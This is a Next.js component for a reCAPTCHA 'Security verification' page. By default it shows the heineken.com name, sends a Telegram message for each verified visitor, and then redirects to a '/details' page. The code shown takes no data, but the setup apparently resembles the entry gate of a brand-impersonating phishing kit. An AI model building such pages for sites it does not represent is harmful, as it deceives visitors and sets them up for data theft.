"use client";

import { useRouter } from "next/navigation";
import { useCallback, useEffect, useRef, useState } from "react";
import RecaptchaWidget from "./RecaptchaWidget";
import { StarIcon } from "./icons";
import { reportVerification } from "@/lib/report";

type SecurityVerificationProps = {
  /** Host shown next to the site mark, e.g. "heineken.com". */
  siteName?: string;
  /** Where to go once the visitor is verified. Pass null to stay on this page. */
  next?: string | null;
};

/** How long the green check stays visible before the next page opens. */
const REDIRECT_DELAY_MS = 700;

/**
 * What the server says we should render. It is fetched at runtime (not baked
 * into the bundle), so keys added to .env.local apply after a restart:
 *   real        → genuine reCAPTCHA v2, token verified by /api/captcha
 *   demo        → development without keys: visual replica, clearly labelled
 *   unavailable → production without keys: the gate refuses to continue
 */
type Gate = { mode: "real" | "demo" | "unavailable"; siteKey: string | null };

export default function SecurityVerification({ siteName = "heineken.com", next = "/details" }: SecurityVerificationProps) {
  const router = useRouter();
  const handled = useRef(false);
  const [gate, setGate] = useState<Gate | null>(null);
  const [configError, setConfigError] = useState("");
  const [serverError, setServerError] = useState("");

  /* ------------------------------------------------ which widget to show */

  useEffect(() => {
    let alive = true;
    fetch("/api/captcha", { cache: "no-store" })
      .then(async (res) => {
        const data = (await res.json().catch(() => null)) as Gate | null;
        if (!alive) return;
        if (!data || (data.mode !== "real" && data.mode !== "demo" && data.mode !== "unavailable")) {
          setConfigError("Could not load the verification settings. Please reload the page.");
          return;
        }
        setGate({ mode: data.mode, siteKey: data.siteKey ?? null });
      })
      .catch(() => {
        if (alive) setConfigError("Could not load the verification settings. Please reload the page.");
      });
    return () => {
      alive = false;
    };
  }, []);

  /* ------------------------------------------------------------ verdicts */

  const verifyToken = useCallback(async (token: string): Promise<boolean> => {
    try {
      const res = await fetch("/api/captcha", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ token }),
        cache: "no-store",
      });
      const data = (await res.json().catch(() => ({}))) as { ok?: boolean; error?: string };
      if (res.ok && data.ok === true) {
        setServerError("");
        return true;
      }
      setServerError(
        data.error === "not-configured"
          ? "This check is not configured yet. Please try again later."
          : "We couldn't verify the captcha. Please try again.",
      );
    } catch {
      setServerError("Network error while verifying. Please try again.");
    }
    return false;
  }, []);

  const handleVerified = useCallback(
    async (token: string | null): Promise<boolean> => {
      if (handled.current) return false;

      // Real reCAPTCHA → Google must confirm the token before we continue.
      // Demo mode (development, no keys) → no token, nothing to check.
      if (token) {
        const accepted = await verifyToken(token);
        if (!accepted) return false;
      }

      handled.current = true;

      // Fire-and-forget: localStorage + one Telegram message. Never blocks the page.
      void reportVerification();

      if (next) {
        router.prefetch(next);
        window.setTimeout(() => router.push(next), REDIRECT_DELAY_MS);
      }
      return true;
    },
    [next, router, verifyToken],
  );

  /* ---------------------------------------------------------- the widget */

  let widget: React.ReactNode;
  if (gate === null) {
    widget = <div className="card__captcha-skeleton" aria-hidden="true" />;
  } else if (gate.mode === "real" && gate.siteKey) {
    widget = <RecaptchaWidget siteKey={gate.siteKey} onVerify={handleVerified} />;
  } else if (gate.mode === "demo") {
    widget = (
      <>
        <RecaptchaWidget onVerify={handleVerified} />
        <p className="card__notice card__notice--info">
          <strong>Demo widget</strong> — no reCAPTCHA keys, so this box verifies nobody. Add{" "}
          <code>RECAPTCHA_SITE_KEY</code> + <code>RECAPTCHA_SECRET_KEY</code> to <code>.env.local</code> and restart.
        </p>
      </>
    );
  } else {
    widget = (
      <p className="card__notice" role="alert">
        Verification is temporarily unavailable. Please try again shortly.
      </p>
    );
  }

  return (
    <section className="card" aria-labelledby="verification-title">
      <div className="card__brand">
        <StarIcon size={15} />
        <span className="card__brand-name">{siteName}</span>
      </div>

      <h1 id="verification-title" className="card__title">
        Security verification
      </h1>

      <p className="card__desc">
        Complete the verification below to continue. This helps protect the site
        from automated abuse.
      </p>

      {widget}

      {(serverError || configError) && (
        <p className="card__notice" role="alert">
          {serverError || configError}
        </p>
      )}

      <p className="card__legal">
        Protected by{" "}
        <a href="https://www.google.com/recaptcha/about/" rel="noreferrer">
          reCAPTCHA
        </a>
        , Google{" "}
        <a href="https://policies.google.com/privacy" rel="noreferrer">
          Privacy Policy
        </a>{" "}
        and{" "}
        <a href="https://policies.google.com/terms" rel="noreferrer">
          Terms of Service
        </a>{" "}
        apply.
      </p>
    </section>
  );
}
